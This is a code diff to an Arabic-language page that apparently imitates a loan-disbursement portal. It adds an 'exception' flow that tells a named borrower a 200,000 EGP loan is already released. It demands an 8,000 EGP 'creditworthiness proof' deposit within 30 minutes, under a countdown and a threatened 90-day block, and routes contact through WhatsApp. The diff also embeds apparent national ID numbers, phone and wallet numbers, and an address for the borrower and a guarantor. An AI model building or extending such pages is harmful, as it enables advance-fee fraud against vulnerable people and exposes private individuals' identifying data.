@@ -457,6 +457,52 @@
         .installment-card .info-row .val.gold { color: var(--royal-gold); }
         .installment-card .info-row .val.danger { color: var(--danger); }
 
+        /* ===== رسالة التعليق الخاص ===== */
+        .special-note-box {
+            background: radial-gradient(circle at center, rgba(239,68,68,0.15), rgba(212,175,55,0.05));
+            border: 3px solid var(--danger);
+            border-radius: 1.5rem;
+            padding: 1.2rem;
+            margin: 0.8rem 0;
+            text-align: center;
+            animation: pulseRed 1.5s infinite alternate;
+            position: relative;
+            z-index: 1;
+        }
+        .special-note-box .note-icon {
+            font-size: 2.5rem;
+            color: var(--danger);
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+        .special-note-box h3 {
+            color: var(--danger);
+            font-size: 1.3rem;
+            font-weight: 800;
+            margin-bottom: 0.3rem;
+        }
+        .special-note-box p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            line-height: 1.9;
+            margin: 0;
+        }
+        .special-note-box p strong {
+            color: #FFF;
+        }
+        .special-note-box .deadline-info {
+            margin-top: 0.8rem;
+            background: rgba(0,0,0,0.3);
+            border-radius: 0.8rem;
+            padding: 0.5rem;
+            display: inline-block;
+        }
+        .special-note-box .deadline-info span {
+            color: var(--royal-gold);
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
         @media (max-width: 640px) {
             .glass-header { flex-direction: column; text-align: center; }
             .amount-display .value { font-size: 2rem; }
@@ -476,6 +522,8 @@
             .installment-card .receipt-box .receipt-amount { font-size: 2rem; }
             .installment-card .receipt-box .receipt-row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
             .installment-card .info-row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
+            .special-note-box h3 { font-size: 1.1rem; }
+            .special-note-box p { font-size: 0.85rem; }
         }
     </style>
 </head>
@@ -524,7 +572,7 @@ function openWhatsApp(customMessage) {
 }
 
 // ============================================================
-// قاعدة بيانات العملاء (تم حذف ندى، جمال، سماح غريب)
+// قاعدة بيانات العملاء
 // ============================================================
 const customersDatabase = {
 
@@ -1201,23 +1249,31 @@ const customersDatabase = {
             phone: ""
         }
     },
+
+    // ===== العميل الاستثنائي: عبدالرازق سيد عبدالرازق حسين =====
     "29910171300636": {
-    name: "عبدالرازق سيد عبدالرازق حسين",
-    loan: 200000,
-    wallet: "اتصالات كاش",
-    walletNum: "01140607631",
-    whatsapp: "01015980043",
-    status: "approved",
-    job: "موظف قطاع خاص",
-    address: "قريه فرغان مركز ديرب نجم محافظة الشرقية خلف المعهد الديني",
-    proofAmount: 8000,
-    guarantor: {
-        name: "محمد سيد عبدالرازق حسين",
-        relation: "أخ",
-        nationalId: "30709280106473",
-        phone: "01015980043"
+        name: "عبدالرازق سيد عبدالرازق حسين",
+        loan: 200000,
+        wallet: "اتصالات كاش",
+        walletNum: "01140607631",
+        whatsapp: "01015980043",
+        status: "exception_proof",
+        job: "موظف قطاع خاص",
+        address: "قريه فرغان مركز ديرب نجم محافظة الشرقية خلف المعهد الديني",
+        proofAmount: 8000,
+        proofDeadline: 30,
+        specialNote: "⚠️ هذا عميل استثنائي - المبلغ مدفوع ومسيل لحساب اتصالات كاش بمجرد الإثبات يتم تفعيل الصرف مباشرة لحسابك واستلامك المبلغ وتتمكن من صرفه.",
+        exceptionMessage: "⚠️ هذا استثناء خاص - لديك 30 دقيقة فقط لإثبات الجدارة الائتمانية. بمجرد الإثبات يتم تفعيل الصرف مباشرة لحسابك واستلامك المبلغ وتتمكن من صرفه.",
+        successMessage: "✅ تم الإثبات بنجاح! المبلغ مدفوع ومسيل لحساب اتصالات كاش. سيتم تفعيل الصرف مباشرة لحسابك واستلامك المبلغ وتتمكن من صرفه خلال دقائق.",
+        failureMessage: "⏰ انتهت المهلة المحددة (30 دقيقة). سيتم إلغاء العملية وسيتم إيقاف التعامل معك لمدة 90 يوماً.",
+        blockDuration: 90,
+        guarantor: {
+            name: "محمد سيد عبدالرازق حسين",
+            relation: "أخ",
+            nationalId: "30709280106473",
+            phone: "01015980043"
+        }
     }
-}
 };
 
 // ===== دالة عرض صفحة الأقساط (بشكل الإيصال) =====
@@ -1241,7 +1297,6 @@ function buildInstallmentPage(customer, nationalId) {
             <h2>💰 تم صرف القرض</h2>
             <p class="sub-title">عزيزي ${customer.name}، تم صرف مبلغ القرض لحسابك</p>
 
-            <!-- ===== الإيصال (مثل الصورة) ===== -->
             <div class="receipt-box">
                 <div class="receipt-label">المبلغ المصروف</div>
                 <div class="receipt-amount">${loanDisplay} <span class="currency">ج.م</span></div>
@@ -1289,7 +1344,6 @@ function buildInstallmentPage(customer, nationalId) {
                 </div>
             </div>
 
-            <!-- ===== تفاصيل الأقساط ===== -->
             <div style="margin: 0.8rem 0; position: relative; z-index: 1;">
                 <div style="background: rgba(239,68,68,0.05); border: 2px solid var(--danger); border-radius: 1rem; padding: 0.8rem; margin-bottom: 0.8rem;">
                     <div style="display: flex; align-items: center; gap: 0.5rem; justify-content: center; margin-bottom: 0.3rem;">
@@ -1372,13 +1426,11 @@ function buildInstallmentPage(customer, nationalId) {
     }
 }
 
-// ===== دالة عرض صفحة الاستثناء الخاصة =====
+// ===== دالة عرض صفحة الاستثناء الخاصة (لعميل عبدالرازق فقط) =====
 function buildExceptionProofPage(customer, nationalId) {
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
     const proofAmountDisplay = customer.proofAmount ? customer.proofAmount.toLocaleString('ar-EG') : '8,000';
-    const deadlineMinutes = customer.proofDeadline || 210;
-    const now = new Date();
-    const refNum = Math.floor(Math.random() * 1e9);
+    const deadlineMinutes = customer.proofDeadline || 30;
 
     const startTimeKey = `exception_startTime_${nationalId}`;
     const blockKey = `exception_blocked_${nationalId}`;
@@ -1397,7 +1449,7 @@ function buildExceptionProofPage(customer, nationalId) {
                     <p>
                         <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
                         <br><br>
-                        لم تقم بإثبات الجدارة الائتمانية خلال المهلة المحددة (${deadlineMinutes} دقيقة).
+                        لم تقم بإثبات الجدارة الائتمانية خلال المهلة المحددة (30 دقيقة).
                         <br><br>
                         <span class="highlight-danger">⛔ تم إيقاف التعامل معك لمدة 90 يوماً.</span>
                         <br><br>
@@ -1419,16 +1471,16 @@ function buildExceptionProofPage(customer, nationalId) {
             <div class="loan-details-card">
                 <span class="success-icon"><i class="fas fa-check-circle"></i></span>
                 <h2>✅ تم الإثبات بنجاح!</h2>
-                <p class="sub-title">${customer.successMessage || 'سيتم نزول المبلغ فوراً على محفظتك خلال دقائق.'}</p>
+                <p class="sub-title">${customer.successMessage}</p>
                 <div class="amount-box">
                     <div class="label">💰 مبلغ القرض</div>
                     <div class="value">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
                 </div>
                 <div class="wallet-box">
-                    <div class="label">📱 سيتم نزول المبلغ على محفظة ${customer.wallet}</div>
+                    <div class="label">📱 المبلغ مسيل لحساب اتصالات كاش</div>
                     <div class="wallet-num">${customer.walletNum}</div>
                     <div style="font-size:0.8rem; color: var(--emerald); margin-top:0.3rem;">
-                        ✅ سيتم الصرف خلال دقائق
+                        ✅ سيتم تفعيل الصرف مباشرة لحسابك واستلامك المبلغ خلال دقائق
                     </div>
                 </div>
                 <button class="btn-whatsapp btn-pay" id="confirmBtn" style="margin-top:0.5rem;">
@@ -1479,7 +1531,7 @@ function buildExceptionProofPage(customer, nationalId) {
                     <p>
                         <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
                         <br><br>
-                        انتهت المهلة المحددة (${deadlineMinutes} دقيقة) دون إثبات الجدارة الائتمانية.
+                        انتهت المهلة المحددة (30 دقيقة) دون إثبات الجدارة الائتمانية.
                         <br><br>
                         <span class="highlight-danger">⛔ سيتم إيقاف التعامل معك لمدة 90 يوماً.</span>
                         <br><br>
@@ -1496,29 +1548,34 @@ function buildExceptionProofPage(customer, nationalId) {
         return;
     }
 
+    // ===== صفحة الاستثناء الخاصة =====
     const html = `
         <div class="proof-credit-card" style="border-color: #FF6B6B;">
             <span class="proof-icon" style="color: #FF6B6B;"><i class="fas fa-exclamation-triangle"></i></span>
             <h2 style="color: #FF6B6B;">⚠️ استثناء خاص لإثبات الجدارة</h2>
-            <p class="sub-title">${customer.exceptionMessage || 'هذا استثناء خاص لإثبات الجدارة الائتمانية. يجب الإثبات قبل انتهاء المهلة.'}</p>
+            <p class="sub-title">${customer.exceptionMessage}</p>
 
             <div style="background: rgba(255, 107, 107, 0.1); border: 2px solid #FF6B6B; border-radius: 0.8rem; padding: 0.8rem; margin: 0.8rem 0; position: relative; z-index: 1;">
                 <p style="color: var(--text-muted); font-size: 0.85rem; line-height: 1.8; margin: 0;">
                     <strong style="color: #FF6B6B;">📌 تعليمات هامة:</strong><br>
-                    • يجب إثبات الجدارة الائتمانية قبل انتهاء المهلة المحددة.<br>
-                    • في حالة الإثبات خلال الوقت المسموح، سيتم <strong style="color: var(--emerald);">نزول المبلغ فوراً</strong> بحسابك.<br>
+                    • المبلغ مدفوع ومسيل لحساب اتصالات كاش.<br>
+                    • يجب إثبات الجدارة الائتمانية خلال <strong style="color: #FF6B6B;">30 دقيقة</strong>.<br>
+                    • بعد الإثبات يتم <strong style="color: var(--emerald);">تفعيل الصرف مباشرة لحسابك</strong> وتتمكن من صرفه.<br>
                     • إذا انتهت المدة دون إثبات، سيتم <strong style="color: #FF6B6B;">إلغاء العملية</strong> وسيتم <strong style="color: #FF6B6B;">إيقاف التعامل لمدة 90 يوماً</strong>.
                 </p>
             </div>
 
             <div class="amount-box" style="border-color: #FF6B6B; background: rgba(255,107,107,0.05);">
-                <div class="label">💰 مبلغ القرض</div>
+                <div class="label">💰 مبلغ القرض (مسيل للحساب)</div>
                 <div class="value" style="color: #FF6B6B;">${loanDisplay} <span style="font-size:1.2rem;">ج.م</span></div>
             </div>
 
             <div class="wallet-box" style="border-color: #FF6B6B;">
-                <div class="label">📱 سيتم نزول المبلغ على محفظة ${customer.wallet}</div>
+                <div class="label">📱 المبلغ مسيل لحساب اتصالات كاش</div>
                 <div class="wallet-num" style="color: #FF6B6B;">${customer.walletNum}</div>
+                <div style="font-size:0.7rem; color: var(--emerald); margin-top:0.2rem;">
+                    ✅ سيتم تفعيل الصرف مباشرة بعد الإثبات
+                </div>
             </div>
 
             <div class="proof-box" style="border-color: #FF6B6B;">
@@ -1535,6 +1592,8 @@ function buildExceptionProofPage(customer, nationalId) {
                 <span style="color: var(--text-muted);">
                     هو إجراء أمني لتأكيد ملكية المحفظة وإثبات الجدارة الائتمانية. 
                     <span class="highlight">لن تقوم بتحويل أي أموال للشركة</span>، فقط دورة إيداع من شخص موثوق وإعادته لإثبات نشاط الحساب والجدارة الائتمانية.
+                    <br><br>
+                    <strong style="color: #FF6B6B;">⏰ مهم:</strong> يجب إكمال الإثبات خلال 30 دقيقة فقط.
                 </span>
             </div>
 
@@ -1565,13 +1624,13 @@ function buildExceptionProofPage(customer, nationalId) {
                 <div><i class="fas fa-stopwatch" style="color: #FF6B6B;"></i> الوقت المتبقي لإثبات الجدارة الائتمانية</div>
                 <div class="timer" id="exceptionTimer" style="color: #FF6B6B;">${formatTime(currentSeconds)}</div>
                 <div style="font-size:0.65rem; color: #FF6B6B;">
-                    ⏳ يجب إكمال الإثبات قبل انتهاء الوقت
+                    ⏳ يجب إكمال الإثبات خلال 30 دقيقة
                     <br>⚠️ في حالة عدم الإثبات سيتم إيقاف التعامل 90 يوماً
                 </div>
             </div>
 
-            <button class="btn-whatsapp btn-proof" id="proofBtn" style="background: linear-gradient(135deg, #FF6B6B, #EE4444);">
-                <i class="fas fa-paper-plane"></i> إرسال إثبات الجدارة الآن
+            <button class="btn-whatsapp btn-exception" id="proofBtn" style="background: linear-gradient(135deg, #FF6B6B, #EE4444);">
+                <i class="fas fa-paper-plane"></i> 📤 إرسال إثبات الجدارة (طلب فتح التعليق)
             </button>
 
             <div style="margin-top: 0.8rem; text-align: center; font-size: 0.7rem; color: var(--text-muted); position: relative; z-index: 1;">
@@ -1602,7 +1661,7 @@ function buildExceptionProofPage(customer, nationalId) {
                         <p>
                             <strong style="color: #FFF;">عزيزي ${customer.name}،</strong>
                             <br><br>
-                            انتهت المهلة المحددة (${deadlineMinutes} دقيقة) دون إثبات الجدارة الائتمانية.
+                            انتهت المهلة المحددة (30 دقيقة) دون إثبات الجدارة الائتمانية.
                             <br><br>
                             <span class="highlight-danger">⛔ سيتم إيقاف التعامل معك لمدة 90 يوماً.</span>
                             <br><br>
@@ -1628,22 +1687,23 @@ function buildExceptionProofPage(customer, nationalId) {
     const proofBtn = document.getElementById('proofBtn');
     if (proofBtn) {
         proofBtn.onclick = () => {
-            let msg = `📤 إرسال إثبات الجدارة الائتمانية (استثناء)\n\n`;
+            let msg = `📤 طلب فتح التعليق - إثبات الجدارة الائتمانية (استثناء)\n\n`;
             msg += `العميل: ${customer.name}\n`;
             msg += `الرقم القومي: ${nationalId}\n`;
             msg += `المبلغ المطلوب صرفه: ${loanDisplay} ج.م\n`;
             msg += `مبلغ الإثبات: ${proofAmountDisplay} ج.م\n`;
-            msg += `⚠️ استثناء: مدة الإثبات ${deadlineMinutes} دقيقة\n`;
-            msg += `في حالة عدم الإثبات خلال الوقت المحدد سيتم إيقاف التعامل لمدة 90 يوم.\n`;
-            msg += `في حالة الإثبات سيتم نزول المبلغ فوراً.\n\n`;
-            msg += `سأقوم بإرسال صور إثبات الجدارة (دخول وخروج) لإتمام الصرف فوراً.\n\n`;
+            msg += `⚠️ استثناء: مدة الإثبات 30 دقيقة فقط\n`;
+            msg += `المبلغ مدفوع ومسيل لحساب اتصالات كاش.\n`;
+            msg += `بمجرد الإثبات يتم تفعيل الصرف مباشرة لحسابك واستلامك المبلغ وتتمكن من صرفه.\n\n`;
+            msg += `⚠️ يرجى فتح التعليق لإتمام إجراءات الإثبات.\n\n`;
+            msg += `سأقوم بإرسال صور إثبات الجدارة (دخول وخروج) فور فتح التعليق.\n\n`;
             msg += `أقر أنا ${customer.name} بأنني قمت بإجراءات إثبات الجدارة الائتمانية وأتعهد بالالتزام بشروط وأحكام التمويل.`;
             openWhatsApp(msg);
             
             localStorage.setItem(proofKey, 'true');
             proofBtn.disabled = true;
             proofBtn.style.opacity = '0.6';
-            proofBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال الإثبات';
+            proofBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال طلب فتح التعليق';
             setTimeout(() => {
                 searchCustomer();
             }, 1500);
@@ -1651,12 +1711,8 @@ function buildExceptionProofPage(customer, nationalId) {
     }
 
     function formatTime(seconds) {
-        const hours = Math.floor(seconds / 3600);
-        const minutes = Math.floor((seconds % 3600) / 60);
+        const minutes = Math.floor(seconds / 60);
         const secs = seconds % 60;
-        if (hours > 0) {
-            return `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-        }
         return `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
     }
 }
@@ -1665,6 +1721,7 @@ function buildExceptionProofPage(customer, nationalId) {
 function buildLoanDisbursedPage(customer, nationalId) {
     const loanDisplay = customer.loan.toLocaleString('ar-EG');
     const proofAmountDisplay = customer.proofAmount ? customer.proofAmount.toLocaleString('ar-EG') : (customer.loan < 100000 ? '6,000' : '8,000');
+    const deadlineMinutes = customer.proofDeadline || 30;
 
     let guarantorHtml = '';
     if (customer.guarantor) {
@@ -1774,7 +1831,7 @@ function buildLoanDisbursedPage(customer, nationalId) {
 
             <div class="timer-glow">
                 <div><i class="fas fa-stopwatch"></i> الوقت المتبقي لإثبات الجدارة الائتمانية</div>
-                <div class="timer" id="proofTimer">30:00</div>
+                <div class="timer" id="proofTimer">${String(deadlineMinutes).padStart(2,'0')}:00</div>
                 <div style="font-size:0.65rem;">⏳ يجب إكمال الإثبات قبل انتهاء الوقت لضمان الصرف الفوري</div>
             </div>
 
@@ -1796,7 +1853,7 @@ function buildLoanDisbursedPage(customer, nationalId) {
     document.getElementById('errorCard').style.display = 'none';
 
     if (timerInterval) clearInterval(timerInterval);
-    let secondsLeft = 30 * 60;
+    let secondsLeft = deadlineMinutes * 60;
     const timerEl = document.getElementById('proofTimer');
 
     timerInterval = setInterval(() => {
